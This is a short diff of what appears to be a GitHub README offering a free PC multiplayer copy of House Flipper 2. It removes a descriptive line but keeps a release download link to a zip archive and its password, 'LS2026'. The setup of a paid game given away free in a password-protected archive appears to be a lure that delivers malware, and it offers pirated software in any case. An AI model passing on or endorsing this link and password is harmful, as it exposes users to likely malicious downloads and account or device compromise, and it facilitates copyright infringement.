@@ -7,7 +7,7 @@ Complete ready-to-use **House Flipper 2 Free For PC Multiplayer** — the full u
 
 ---
 ## 📥 Download
-Password-protected archive with the complete multiplayer edition – extract and start flipping houses instantly.  
+
 📥 [Download `House-Flipper-2-Multiplayer.zip`](https://github.com/AFahim02/House-Flipper-Free-For-PC-Multiplayer/releases/download/Game/House-Flipper-2-Multiplayer.zip)  
 🔐 `LS2026`
 ---
